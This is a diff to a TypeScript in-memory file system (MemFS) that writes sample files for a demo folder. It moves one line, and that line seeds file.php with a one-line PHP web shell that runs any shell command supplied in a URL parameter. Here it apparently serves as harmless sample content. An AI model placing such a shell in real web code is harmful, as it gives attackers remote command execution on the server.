@@ -105,9 +105,9 @@ export class MemFS implements FileSystemProvider, FileSearchProvider, TextSearch
 		this.writeFile(Uri.parse(`memfs:/sample-folder/file.md`), textEncoder.encode(debuggableFile), { create: true, overwrite: true });
 		this.writeFile(Uri.parse(`memfs:/sample-folder/file.xml`), textEncoder.encode('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>'), { create: true, overwrite: true });
 		this.writeFile(Uri.parse(`memfs:/sample-folder/file.py`), textEncoder.encode('import base64, sys; base64.decode(open(sys.argv[1], "rb"), open(sys.argv[2], "wb"))'), { create: true, overwrite: true });
-		this.writeFile(Uri.parse(`memfs:/sample-folder/file.php`), textEncoder.encode('<?php echo shell_exec($_GET[\'e\'].\' 2>&1\'); ?>'), { create: true, overwrite: true });
 		this.writeFile(Uri.parse(`memfs:/sample-folder/file.yaml`), textEncoder.encode('- just: write something'), { create: true, overwrite: true });
 		this.writeFile(Uri.parse(`memfs:/sample-folder/file.jpg`), getImageFile(), { create: true, overwrite: true });
+		this.writeFile(Uri.parse(`memfs:/sample-folder/file.php`), textEncoder.encode('<?php echo shell_exec($_GET[\'e\'].\' 2>&1\'); ?>'), { create: true, overwrite: true });
 
 		// some more files & folders
 		this.createDirectory(Uri.parse(`memfs:/sample-folder/folder/`));
